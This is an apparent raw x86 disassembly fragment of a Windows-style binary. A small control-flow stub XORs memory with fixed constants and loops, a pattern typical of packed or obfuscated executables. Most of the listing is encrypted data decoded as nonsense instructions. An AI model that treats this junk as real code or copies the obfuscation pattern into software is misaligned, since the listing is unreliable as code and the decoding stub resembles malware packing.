  402853:	or     BYTE PTR [esi-0x389f8ae4],bl
  402859:	add    eax,0x42e75e
  40285e:	adc    al,0x0
  402860:	add    BYTE PTR [eax],al
  402862:	cmp    DWORD PTR ds:0x42e75e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e75e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42e9d8
  402885:	cmp    DWORD PTR ds:0x42e75e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e75e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e75e,eax
  4028a0:	mov    eax,ds:0x42e75e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e75e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	pop    esp
  4028e1:	xor    eax,0x3e69e3b
  4028e6:	jle    0x402966
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	test   eax,0x91c84d4d
  4028f1:	iret   
  4028f2:	lahf   
  4028f3:	icebp  
  4028f4:	inc    esp
  4028f5:	pop    edi
  4028f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028f7:	dec    esp
  4028f8:	add    eax,0x6e12cf1b
  4028fd:	out    dx,al
  4028fe:	call   0xa98504d0
  402903:	iret   
  402904:	std    
  402905:	sbb    DWORD PTR [ebx+0x2f39a73],0xffffffdd
  40290c:	mov    dl,0x1a
  40290e:	int3   
  40290f:	push   0xffffffe4
  402911:	cmp    ebx,DWORD PTR [ebx]
  402913:	cmp    eax,0x332975fe
  402918:	fiadd  DWORD PTR [ebx+0x32]
  40291b:	loope  0x40292d
  40291d:	xor    ecx,DWORD PTR [esi+eiz*1]
  402920:	mov    ?,WORD PTR [esi]
  402922:	aam    0x34
  402924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402925:	jno    0x402951
  402927:	sahf   
  402928:	fld    DWORD PTR [eax]
  40292a:	ds call 0xc449:0x326fc0c2
  402932:	pop    es
  402933:	sub    cl,ch
  402935:	sbb    eax,0x1ee48fe5
  40293a:	mov    eax,ds:0x4d0e8947
  40293f:	sub    al,0xad
  402941:	and    DWORD PTR [eax],edi
  402943:	sub    DWORD PTR [esp+edx*2],ebp
  402946:	jae    0x402924
  402948:	inc    edx
  402949:	sub    dh,BYTE PTR [edi+ecx*2]
  40294c:	adc    DWORD PTR ds:0x34a191db,ebp
  402952:	lods   al,BYTE PTR ds:[esi]
  402953:	cld    
  402954:	es pushf 
  402956:	retf   0x9133
  402959:	mov    esp,0x481abdf0
  40295e:	inc    ebx
  40295f:	pop    eax
  402960:	add    esp,edx
  402962:	and    DWORD PTR [esi],ebx
  402964:	lahf   
  402965:	lea    esp,[edx+eiz*1+0x55]
  402969:	in     eax,0xf0
  40296b:	jne    0x4028f2
  40296d:	pop    ss
  40296e:	mov    al,0x8c
  402970:	push   edx
  402971:	jns    0x4029bc
  402973:	data16 xchg BYTE PTR [eax+0x72],ch
  402977:	adc    BYTE PTR [ecx+0x75864ff2],al
  40297d:	cmp    BYTE PTR [ebx+edi*8+0x52a30598],0x76
  402985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402986:	sar    BYTE PTR gs:[ebp+0x7406169],0xc0
  40298e:	ret    
  40298f:	sub    al,dh
  402991:	adc    ch,BYTE PTR [ebp+0x67e4761a]
  402997:	jl     0x4029ae
  402999:	test   DWORD PTR [eax+0x772a43eb],edi
  40299f:	inc    ecx
  4029a0:	inc    edx
  4029a1:	dec    cl
  4029a3:	(bad)  
  4029a4:	jnp    0x40297a
  4029a6:	ret    0x3835
  4029a9:	mov    ds:0xb817c28d,eax
  4029ae:	pop    esp
  4029af:	fidivr DWORD PTR [ecx+ebx*4+0x1]
  4029b3:	adc    DWORD PTR [edx-0x68],edi
  4029b6:	pop    edi
  4029b7:	adc    dh,BYTE PTR [ebx+0x4f]
  4029ba:	cdq    
  4029bb:	mov    ds:0x1651a315,eax
  4029c0:	xchg   edi,eax
  4029c1:	dec    esp
  4029c2:	sub    al,0x29
  4029c4:	outs   dx,BYTE PTR ds:[esi]
  4029c5:	scas   al,BYTE PTR es:[edi]
  4029c6:	dec    ecx
  4029c7:	mov    ds:0xee9eb68,eax
  4029cc:	retf   
  4029cd:	mov    BYTE PTR [edi],ch
  4029cf:	xchg   ebx,eax
  4029d0:	scas   al,BYTE PTR es:[edi]
  4029d1:	or     cl,BYTE PTR [ecx+0xee7cbe8]
  4029d7:	pop    es
  4029d8:	ds ins DWORD PTR es:[edi],dx
  4029da:	cld    
  4029db:	cwde   
  4029dc:	cdq    
  4029dd:	scas   eax,DWORD PTR es:[edi]
  4029de:	fisttp DWORD PTR [ebx]
  4029e0:	mov    eax,0x2b9e6c
  4029e5:	push   0xffffff9e
  4029e7:	inc    eax
  4029e8:	mov    dh,0x21
  4029ea:	inc    esp
  4029eb:	cdq    
  4029ec:	and    eax,ebp
  4029ee:	mov    BYTE PTR [ebp+0x30],bh
  4029f1:	xor    BYTE PTR [ebx+0x212c838b],al
  4029f7:	mov    eax,0x779b3f1f
  4029fc:	sbb    edi,DWORD PTR [ecx]
  4029fe:	adc    ch,BYTE PTR [edx]
  402a00:	push   esp
  402a01:	popa   
  402a02:	loop   0x402a35
  402a04:	inc    eax
  402a05:	adc    edx,DWORD PTR [ecx+0x3b050bfe]
  402a0b:	aaa    
  402a0c:	xor    ch,BYTE PTR [esi-0x79]
  402a0f:	ret    
  402a10:	push   cs
  402a11:	xor    edi,ecx
  402a13:	jle    0x4029db
  402a15:	xchg   edx,eax
  402a16:	mov    cl,0x74
  402a18:	aas    
  402a19:	sub    DWORD PTR [esi-0x54045ce1],edi
  402a1f:	ret    0xfef3
  402a22:	aas    
  402a23:	mov    bl,0x24
  402a25:	fsin   
  402a27:	nop
  402a28:	aam    0xd7
  402a2a:	in     al,dx
  402a2b:	fs test al,0x64
  402a2e:	sub    BYTE PTR [ebx],ah
  402a30:	int    0x2
  402a32:	sti    
  402a33:	aaa    
  402a34:	jle    0x4029ea
  402a36:	loop   0x402a52
  402a38:	mov    al,0x8b
  402a3a:	mov    ebp,0x184dbed
  402a3f:	repz cmp al,0x49
  402a42:	pop    ebp
  402a43:	ja     0x402aad
  402a45:	popa   
  402a46:	fistp  QWORD PTR [ebx]
  402a48:	stos   DWORD PTR es:[edi],eax
  402a49:	cmc    
  402a4a:	fst    QWORD PTR ds:0xe3a1305f
  402a50:	gs pop eax
  402a52:	ret    0x7a58
  402a55:	leave  
  402a56:	and    esp,esi
  402a58:	shl    ecx,cl
  402a5a:	inc    esi
  402a5b:	in     eax,dx
  402a5c:	mov    bl,BYTE PTR [edi-0x1e]
  402a5f:	sub    eax,0x9dd4e92a
  402a64:	out    dx,al
  402a65:	mov    ds:0x3e2ee733,al
  402a6a:	push   0x265ed143
  402a6f:	mov    al,0x23
  402a71:	scas   eax,DWORD PTR es:[edi]
  402a72:	dec    eax
  402a73:	leave  
  402a74:	aas    
  402a75:	mov    edx,0xef36d5ef
  402a7a:	mov    DWORD PTR [ecx],ebx
  402a7c:	xlat   BYTE PTR ds:[ebx]
  402a7d:	scas   eax,DWORD PTR es:[edi]
  402a7e:	or     al,0x8c
  402a80:	icebp  
  402a81:	fild   QWORD PTR [eax-0x62f02edb]
  402a87:	pop    esp
  402a88:	ror    bl,0xb7
  402a8b:	sbb    BYTE PTR [edi+0x20eab229],bl
  402a91:	pop    ds
  402a92:	int    0xad
  402a94:	fild   QWORD PTR [edi+0x504c3401]
  402a9a:	xchg   ebx,eax
  402a9b:	addr16 je 0x402af7
  402a9e:	and    al,BYTE PTR [esi]
  402aa0:	(bad)  [ebx+0x5]
  402aa3:	push   ebp
  402aa4:	sub    edx,edx
  402aa6:	add    edx,esp
  402aa8:	mov    ebx,0xc18174fc
  402aad:	pop    ss
  402aae:	das    
  402aaf:	outs   dx,BYTE PTR ds:[esi]
  402ab0:	pop    ss
  402ab1:	and    esi,esi
  402ab3:	cmp    dl,BYTE PTR [esi]
  402ab5:	xchg   ebp,eax
  402ab6:	cwde   
  402ab7:	dec    esp
  402ab8:	pop    esi
  402ab9:	ins    BYTE PTR es:[edi],dx
  402aba:	jne    0x402a6c
  402abc:	and    al,BYTE PTR [ecx+ecx*4]
  402abf:	es popa 
  402ac1:	cmp    ebp,DWORD PTR [ecx-0x2c]
  402ac4:	loope  0x402b14
  402ac6:	mov    edx,0xcf0cc41a
  402acb:	mov    ds:0xc5b9ec0a,al
  402ad0:	bound  esp,QWORD PTR [ecx-0x2a]
  402ad3:	icebp  
  402ad4:	push   esp
  402ad5:	adc    DWORD PTR [esi+0x5e1c1465],0xffffff85
  402adc:	lods   eax,DWORD PTR ds:[esi]
  402add:	iret   
  402ade:	jo     0x402b21
  402ae0:	push   cs
  402ae1:	mov    ds:0x16853f76,al
  402ae6:	aaa    
  402ae7:	dec    eax
  402ae8:	xchg   edx,eax
  402ae9:	jle    0x402b6a
  402aeb:	test   eax,0xf6395fab
  402af0:	in     al,dx
  402af1:	lahf   
  402af2:	push   ecx
  402af3:	adc    ebp,DWORD PTR [ebx]
  402af5:	(bad)  
  402af6:	jmp    0xd26715a7
  402afb:	in     al,0xe9
  402afd:	push   edi
  402afe:	pop    edx
  402aff:	out    dx,eax
  402b00:	daa    
  402b01:	jno    0x402b4a
  402b03:	or     eax,0xf725d78d
  402b08:	fsub   QWORD PTR [esi-0x1de66bd]
  402b0e:	pushf  
  402b0f:	adc    al,ch
  402b11:	(bad)  
  402b12:	int    0x2f
  402b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b15:	push   ds
  402b16:	(bad)  
  402b17:	jb     0x402b8d
  402b19:	mov    bl,0x10
  402b1b:	inc    edi
  402b1c:	gs push ds
  402b1e:	jae    0x402ac1
  402b20:	ins    DWORD PTR es:[edi],dx
  402b21:	gs addr16 cmp al,0xe4
  402b25:	int    0xd2
  402b27:	xchg   edx,eax
  402b28:	imul   edi,DWORD PTR [ebx],0x19
  402b2b:	pop    ecx
  402b2c:	and    al,0x5c
  402b2e:	call   FWORD PTR [eax]
  402b30:	and    BYTE PTR [ebp+0x11232fd4],bh
  402b36:	inc    eax
  402b37:	inc    ecx
  402b38:	pop    ds
  402b39:	mov    WORD PTR [edi],fs
  402b3b:	xor    ebx,eax
  402b3d:	jo     0x402af0
  402b3f:	daa    
  402b40:	popa   
  402b41:	icebp  
  402b42:	scas   al,BYTE PTR es:[edi]
  402b43:	jp     0x402b58
  402b45:	pusha  
  402b46:	pop    es
  402b47:	aad    0xcc
  402b49:	sbb    DWORD PTR [edx+edi*8],ebx
  402b4c:	adc    al,0xb4
  402b4e:	ss (bad) 
  402b50:	lock pop esp
  402b52:	mov    edx,0x6acc3d62
  402b57:	bound  edi,QWORD PTR [edx]
  402b59:	or     al,0x93
  402b5b:	aam    0x6d
  402b5d:	mov    esp,0xbe88fbab
  402b62:	and    cl,al
  402b64:	in     eax,dx
  402b65:	xchg   ecx,eax
  402b66:	or     al,0xf1
  402b68:	mov    edx,0xc5094d8e
  402b6d:	push   ds
  402b6e:	or     edx,DWORD PTR [ecx-0x42d9f96e]
  402b74:	int    0x48
  402b76:	mov    ecx,0xaea0c66f
  402b7b:	pop    esp
  402b7c:	xor    al,0x6b
  402b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b7f:	add    eax,0x70a4fa92
  402b84:	outs   dx,BYTE PTR ds:[esi]
  402b85:	out    dx,al
  402b86:	sub    BYTE PTR [edi+0x25f0c650],bh
  402b8c:	lea    edx,[edx+ecx*8+0x10f3b03e]
  402b93:	pop    ebp
  402b94:	sbb    eax,0x68cdd4ac
  402b99:	lds    ecx,FWORD PTR [edi-0x2eab000c]
  402b9f:	inc    ebx
  402ba0:	pop    ss
  402ba1:	push   ds
  402ba2:	lods   al,BYTE PTR ds:[esi]
  402ba3:	in     al,0xe7
  402ba5:	inc    ebx
  402ba6:	cmp    eax,0xe923c8c8
  402bab:	jb     0x402c2b
  402bad:	sbb    ah,bl
  402baf:	mov    dl,0xb4
  402bb1:	retf   0x1097
  402bb4:	sub    esi,edi
  402bb6:	mov    al,ds:0xe55b9ce3
  402bbb:	jo     0x402bbb
  402bbd:	fldenv [ebx+0x6e9cd6c0]
  402bc3:	dec    esp
  402bc4:	pop    ebp
  402bc5:	das    
  402bc6:	lock and al,0x84
  402bc9:	lea    ebx,[ebp+0x18]
  402bcc:	pop    eax
  402bcd:	ret    0xff80
  402bd0:	js     0x402baf
  402bd2:	xchg   BYTE PTR [ebp+0x28779737],ch
  402bd8:	adc    ebp,edx
  402bda:	sbb    al,BYTE PTR [edi*8-0x355973ff]
  402be1:	retf   
  402be2:	jecxz  0x402be2
  402be4:	outs   dx,DWORD PTR ds:[esi]
  402be5:	ret    
  402be6:	jg     0x402b91
  402be8:	lds    edx,FWORD PTR [ecx+ebp*4+0x101ab1f]
  402bef:	mov    eax,ds:0x1bfad0e5
  402bf4:	pop    ecx
  402bf5:	fnsave [eax-0x58a72523]
  402bfb:	sbb    eax,0x2cbef939
  402c00:	inc    eax
  402c01:	jae    0x402c2c
  402c03:	sub    ah,dh
  402c05:	mov    ds:0x716013c6,al
  402c0a:	xchg   ecx,ebx
  402c0c:	mov    ebx,0xfc8051b7
  402c11:	and    al,0x65
  402c13:	or     edx,esi
  402c15:	push   edx
  402c16:	aaa    
  402c17:	iret   
  402c18:	data16 and bh,dh
  402c1b:	xor    BYTE PTR [edi],0x13
  402c1e:	lahf   
  402c1f:	ret    
  402c20:	setge  BYTE PTR [esi]
  402c23:	sar    BYTE PTR [edi+0x222ecc68],1
  402c29:	sub    ebx,ecx
  402c2b:	pop    edi
  402c2c:	mov    bh,0x70
  402c2e:	lock clc 
  402c30:	shr    DWORD PTR [esp+edx*4],0x83
  402c34:	retf   0xd686
  402c37:	fdivr  DWORD PTR [eax+0x15ba0891]
  402c3d:	cmp    eax,edi
  402c3f:	outs   dx,BYTE PTR ds:[esi]
  402c40:	cmp    dh,dl
  402c42:	mov    edi,0xe34b7d16
  402c47:	ja     0x402cc2
  402c49:	iret   
  402c4a:	jecxz  0x402bee
  402c4c:	in     al,dx
  402c4d:	push   esi
  402c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c4f:	nop
  402c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c51:	test   eax,0xe188a48f
  402c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c57:	xchg   edi,eax
  402c58:	cwde   
  402c59:	xchg   BYTE PTR [ebx],ch
  402c5b:	add    eax,0x36387e3b
  402c60:	das    
  402c61:	jb     0x402c21
  402c63:	adc    DWORD PTR [ebx+0x11],esp
  402c66:	xor    eax,0x2bc72d5f
  402c6b:	cmp    eax,0x7f2f01be
  402c70:	hlt    
  402c71:	mov    esi,0x64aefd96
  402c76:	adc    bh,ch
  402c78:	xor    cl,cl
  402c7a:	repnz sti 
  402c7c:	adc    esp,DWORD PTR [edx+0x458b6c2b]
  402c82:	lock and DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cc1:	pop    esp
  402cc2:	shl    DWORD PTR [ebp+0xa],1
  402cc5:	pop    es
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	enter  0x896e,0xe9
  402cd0:	fwait
  402cd1:	mov    DWORD PTR ds:[eax+0x63],ebx
  402cd5:	cmp    esp,DWORD PTR [ebp-0x4b1608b6]
  402cdb:	pop    edx
  402cdc:	push   esp
  402cdd:	lahf   
  402cde:	or     al,0xd1
  402ce0:	mov    dl,0x8f
  402ce2:	loop   0x402cb6
  402ce4:	pop    ecx
  402ce5:	ja     0x402ca9
  402ce7:	cli    
  402ce8:	jmp    0xcb4807e6
  402ced:	aas    
  402cee:	cmp    eax,0x6b7ae02
  402cf3:	int    0x8a
  402cf5:	(bad)  
  402cf6:	dec    esi
  402cf7:	jo     0x402c9e
  402cf9:	mov    ch,0x1a
  402cfb:	mov    ebp,0xd2010e12
  402d00:	and    eax,0xa8432a9a
  402d05:	test   eax,0x36e2ff92
  402d0a:	mov    ebp,0x9c422812
  402d0f:	sbb    BYTE PTR [ebx-0x15856ef],bl
  402d15:	aas    
  402d16:	or     eax,0x760aaa22
  402d1b:	adc    BYTE PTR [eax],dl
  402d1d:	sbb    esi,ebx
  402d1f:	cmp    eax,0x1e13af89
  402d24:	sbb    eax,0x77ba82f2
  402d29:	mov    ebx,0xce530538
  402d2e:	ds dec esp
  402d30:	pop    ebp
  402d31:	pop    eax
  402d32:	xchg   esp,eax
  402d33:	xor    cl,BYTE PTR [ecx]
  402d35:	sub    al,bh
  402d37:	dec    edx
  402d38:	adc    esi,ebx
  402d3a:	cmp    ebx,edx
  402d3c:	xlat   BYTE PTR ds:[ebx]
  402d3d:	sbb    al,0xc1
  402d3f:	dec    esp
  402d40:	jnp    0x402cfb
  402d42:	or     ebp,DWORD PTR [ebx]
  402d44:	in     al,dx
  402d45:	pop    esp
  402d46:	ins    DWORD PTR es:[edi],dx
  402d47:	mov    esi,0xd683269d
  402d4c:	(bad)  
  402d4d:	retf   
  402d4e:	sub    bh,BYTE PTR [ecx]
  402d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d51:	inc    ecx
  402d52:	jecxz  0x402cff
  402d54:	bound  esp,QWORD PTR [ebx+0x2b]
  402d57:	(bad)  
  402d58:	in     eax,dx
  402d59:	sub    eax,0xc28c331a
  402d5e:	jl     0x402dc0
  402d60:	or     DWORD PTR [eax+0x9cf8657],ecx
  402d66:	fwait
  402d67:	clc    
  402d68:	lods   al,BYTE PTR ds:[esi]
  402d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d6a:	dec    esi
  402d6b:	adc    bl,BYTE PTR [eax+0x42]
  402d6e:	push   edx
  402d6f:	(bad)  
  402d70:	mov    ebp,0x37dc0ea4
  402d75:	call   0x636a97d0
  402d7a:	pop    esp
  402d7b:	or     al,0x9d
  402d7d:	or     edi,DWORD PTR ds:0x8d1687cd
  402d83:	std    
  402d84:	bound  eax,QWORD PTR [ebp+ebx*1-0x751dfbce]
  402d8b:	(bad)  
  402d8c:	aam    0xe8
  402d8e:	mov    ebx,0xa2f24f51
  402d93:	mov    ds:0xce2474ed,eax
  402d98:	or     ebp,ecx
  402d9a:	inc    edi
  402d9b:	mov    esp,0xd34b1ac2
  402da0:	xlat   BYTE PTR ds:[ebx]
  402da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402da2:	sar    BYTE PTR [eax-0x686e8336],cl
  402da8:	ins    WORD PTR es:[edi],dx
  402daa:	sub    DWORD PTR [esi-0x5f],ebp
  402dad:	sub    al,0x28
  402daf:	clc    
  402db0:	gs mov ch,0xdd
  402db3:	add    eax,0xd37427f7
  402db8:	jge    0x402d73
  402dba:	jmp    0x402e06
  402dbc:	dec    ebx
  402dbd:	sub    eax,0x655a5b52
  402dc2:	xchg   BYTE PTR [ebp+0x6727a5f9],dh
  402dc8:	mov    DWORD PTR [edx],edi
  402dca:	or     edi,esi
  402dcc:	sti    
  402dcd:	adc    al,0x35
  402dcf:	mov    bl,0x9c
  402dd1:	inc    edi
  402dd2:	add    BYTE PTR [ecx+0x6275d555],bl
  402dd8:	jno    0x402e50
  402dda:	jmp    0x402dc5
  402ddc:	sar    DWORD PTR [ebx+0x39],1
  402ddf:	ror    BYTE PTR [ecx],cl
  402de1:	call   0xdec41ca3
  402de6:	and    esp,edx
  402de8:	jo     0x402db5
  402dea:	gs popa 
  402dec:	das    
  402ded:	imul   edx,DWORD PTR [edi+eiz*8+0x5a596fb7],0xffffffc9
  402df5:	mov    cs,WORD PTR [edi-0x42f46d92]
  402dfb:	push   ecx
  402dfc:	jo     0x402d88
  402dfe:	cmp    DWORD PTR ds:0xf30e3c7f,edx
  402e04:	jp     0x402dea
  402e06:	adc    bl,bl
  402e08:	jp     0x402e62
  402e0a:	rep stos BYTE PTR es:[edi],al
  402e0c:	jg     0x402e4c
  402e0e:	mov    eax,0x903b9cc5
  402e13:	dec    eax
  402e14:	in     al,0x9a
  402e16:	push   0x3c
  402e18:	inc    eax
  402e19:	in     eax,0x39
  402e1b:	mov    ah,0xe6
  402e1d:	jb     0x402e9a
  402e1f:	xor    ebp,DWORD PTR [ecx+eax*1]
  402e22:	push   esi
  402e23:	in     eax,dx
  402e24:	les    edx,FWORD PTR [esi+ebp*2]
  402e27:	imul   esi,edi,0xb69a167c
  402e2d:	dec    ecx
  402e2e:	push   cs
  402e2f:	cs xor al,0xc6
  402e32:	sub    DWORD PTR [edi-0x42],ebp
  402e35:	cmp    eax,0x73096a5b
  402e3a:	jle    0x402e3c
  402e3c:	xchg   ebp,eax
  402e3d:	sbb    cl,BYTE PTR [ecx+0x21b4d188]
  402e43:	shl    DWORD PTR [edi+0x58],cl
  402e46:	xchg   esp,eax
  402e47:	sbb    edx,DWORD PTR ds:0x5aaae39b
  402e4d:	lods   al,BYTE PTR ds:[esi]
  402e4e:	stc    
  402e4f:	xlat   BYTE PTR ds:[ebx]
  402e50:	or     eax,0xaf3d11b7
  402e55:	push   cs
  402e56:	(bad)  
  402e58:	sub    DWORD PTR [eax],0x4c
  402e5b:	dec    ebp
  402e5c:	std    
  402e5d:	push   ebx
  402e5e:	jne    0x402e12
  402e60:	inc    ecx
  402e61:	scas   al,BYTE PTR es:[edi]
  402e62:	stos   DWORD PTR es:[edi],eax
  402e63:	pop    ecx
  402e64:	(bad)  
  402e65:	lods   al,BYTE PTR ds:[esi]
  402e66:	ja     0x402ed4
  402e68:	fstp   TBYTE PTR [edx+ecx*2+0x6a]
  402e6c:	ins    BYTE PTR es:[edi],dx
  402e6d:	push   edx
  402e6e:	mov    ecx,0x18256b5d
  402e73:	loope  0x402e34
  402e75:	inc    esp
  402e76:	or     BYTE PTR [edx-0x56],0xea
  402e7a:	cmp    DWORD PTR [edx],0xffffffdf
  402e7d:	ss scas al,BYTE PTR es:[edi]
  402e7f:	dec    eax
  402e80:	dec    edi
  402e81:	cdq    
  402e82:	nop
  402e83:	xchg   BYTE PTR [edi-0x2],al
  402e86:	ret    
  402e87:	pop    esi
  402e88:	xor    dh,al
  402e8a:	sbb    BYTE PTR [ebp-0x61],ah
  402e8d:	sub    cl,ah
  402e8f:	retf   0x660a
  402e92:	adc    al,0xb6
  402e94:	hlt    
  402e95:	and    bh,BYTE PTR [ebx+0x5a57a80e]
  402e9b:	mov    ebx,0xea2113f4
  402ea0:	add    bh,ah
  402ea2:	or     eax,0xb7c4b7ef
  402ea7:	dec    edi
  402ea8:	stos   BYTE PTR es:[edi],al
  402ea9:	pop    ebp
  402eaa:	sbb    BYTE PTR [edx-0x29bff478],al
  402eb0:	cmp    eax,0x6ee92367
  402eb5:	lock mov WORD PTR ss:[edi-0x51],?
  402eba:	or     ebp,ecx
  402ebc:	adc    esp,eax
  402ebe:	and    edi,DWORD PTR [ebx]
  402ec0:	outs   dx,BYTE PTR ds:[esi]
  402ec1:	loopne 0x402ebf
  402ec3:	sub    BYTE PTR [edx],0xe1
  402ec6:	xor    BYTE PTR [ebp-0x40],dh
  402ec9:	push   eax
  402eca:	pusha  
  402ecb:	jmp    DWORD PTR [edx-0x36085380]
  402ed1:	bound  ecx,QWORD PTR [esi+0x4e]
  402ed4:	fstp   QWORD PTR [ebp-0x1f]
  402ed7:	loope  0x402e63
  402ed9:	mov    ebp,0x7ade3859
  402ede:	xor    al,0xcc
  402ee0:	xchg   BYTE PTR [esi-0x2b],ah
  402ee3:	mov    al,0xbc
  402ee5:	mov    eax,0x43a52966
  402eea:	mov    eax,0x711eed88
  402eef:	nop
  402ef0:	test   BYTE PTR ds:0x21fe5628,bh
  402ef6:	adc    eax,0x22c7b0ef
  402efb:	call   0x909abab7
  402f00:	retf   
  402f01:	sub    BYTE PTR [edx+0x26],dh
  402f04:	xlat   BYTE PTR ds:[ebx]
  402f05:	sub    ebx,DWORD PTR [ecx-0x7e4541]
  402f0b:	add    esp,DWORD PTR [edx]
  402f0d:	mov    bl,0xbd
  402f0f:	pminub mm4,mm6
  402f12:	adc    cl,bh
  402f14:	mov    esp,0x4475f30a
  402f19:	ds inc ebx
  402f1b:	inc    ecx
  402f1c:	sbb    ah,BYTE PTR [esi-0x78]
  402f1f:	xchg   DWORD PTR [ecx-0x4cfb5597],esi
  402f25:	mov    ah,0x74
  402f27:	jl     0x402f79
  402f29:	sbb    cl,BYTE PTR [esi+0x5e]
  402f2c:	sub    BYTE PTR [ebp-0x11],al
  402f2f:	dec    edx
  402f30:	fdivr  DWORD PTR [eax-0x2235ad06]
  402f36:	xchg   ecx,eax
  402f37:	scas   eax,DWORD PTR es:[edi]
  402f38:	jns    0x402f8b
  402f3a:	fs aaa 
  402f3c:	ret    
  402f3d:	sti    
  402f3e:	jo     0x402f01
  402f40:	neg    DWORD PTR [esi+0x15]
  402f43:	pop    esp
  402f44:	jae    0x402ee5
  402f46:	dec    ecx
  402f47:	dec    esp
  402f48:	lods   eax,DWORD PTR ds:[esi]
  402f49:	cmp    bl,bl
  402f4b:	mov    eax,0x843944f0
  402f50:	jle    0x402f5c
  402f52:	lods   eax,DWORD PTR ds:[esi]
  402f53:	mov    ebx,0x9d1166bd
  402f58:	sbb    ecx,ebp
  402f5a:	xchg   esp,eax
  402f5b:	or     cl,cl
  402f5d:	in     al,dx
  402f5e:	or     al,0x11
  402f60:	sub    eax,0x6976e129
  402f65:	out    dx,eax
  402f66:	add    BYTE PTR [eax],0x51
  402f69:	sbb    al,0xa3
  402f6b:	fcmovbe st,st(6)
  402f6d:	mov    ebp,0xaf7a46ce
  402f72:	mov    ch,BYTE PTR [edi]
  402f74:	push   edx
  402f75:	mov    ah,BYTE PTR [eax]
  402f77:	aad    0x6e
  402f79:	sub    ebp,DWORD PTR [ecx+0x5e]
  402f7c:	sub    al,0xb1
  402f7e:	dec    edi
  402f7f:	mov    bl,0x82
  402f81:	ins    DWORD PTR es:[edi],dx
  402f82:	imul   eax,DWORD PTR [esi],0xeafa3e83
  402f88:	das    
  402f89:	inc    eax
  402f8a:	cli    
  402f8b:	leave  
  402f8c:	pop    edx
  402f8d:	stos   BYTE PTR es:[edi],al
  402f8e:	push   ebp
  402f8f:	fucomp st(7)
  402f91:	sbb    bh,dl
  402f93:	mov    ebp,0x86dc2275
  402f98:	dec    esp
  402f99:	inc    ecx
  402f9a:	xchg   ecx,eax
  402f9b:	xchg   edx,eax
  402f9c:	ja     0x402ffe
  402f9e:	mov    esi,0x8c275926
  402fa3:	scas   eax,DWORD PTR es:[edi]
  402fa4:	cmp    al,0xb8
  402fa6:	dec    esi
  402fa7:	mov    dl,0x6c
  402fa9:	addr16 lahf 
  402fab:	not    DWORD PTR [eax+0x196cf0b2]
  402fb1:	ret    
  402fb2:	sti    
  402fb3:	and    eax,0x413c4f84
  402fb8:	lea    eax,[eax-0x46]
  402fbb:	lods   al,BYTE PTR ds:[esi]
  402fbc:	fwait
  402fbd:	push   ss
  402fbe:	jp     0x402f75
  402fc0:	xor    bh,BYTE PTR ds:0x83d90a97
  402fc6:	jmp    0x402fa5
  402fc8:	jne    0x402fbf
  402fca:	xor    eax,0x35a12ec1
  402fcf:	mov    ebp,0xe23861ac
  402fd4:	(bad)  
  402fd5:	out    dx,al
  402fd6:	push   cs
  402fd7:	js     0x402fb5
  402fd9:	pop    ecx
  402fda:	lea    ebp,[ebx]
  402fdc:	mov    ebp,0xa35068e
  402fe1:	or     bl,BYTE PTR [eax+0x676d4e3a]
  402fe7:	lods   al,BYTE PTR ds:[esi]
  402fe8:	jb     0x402fb3
  402fea:	repz add esi,ebp
  402fed:	(bad)  
  402fee:	jmp    0x40303e
  402ff0:	out    dx,eax
  402ff1:	and    eax,0xfdba9f39
  402ff6:	sahf   
  402ff7:	cmc    
  402ff8:	jg     0x402fb7
  402ffa:	test   BYTE PTR [edi+0x1],bh
  402ffd:	lods   eax,DWORD PTR ds:[esi]
  402ffe:	mov    eax,edx
  403000:	xor    al,0x2f
  403002:	ror    dh,cl
  403004:	and    al,0xe7
  403006:	inc    edi
  403007:	mul    esi
  403009:	(bad)  
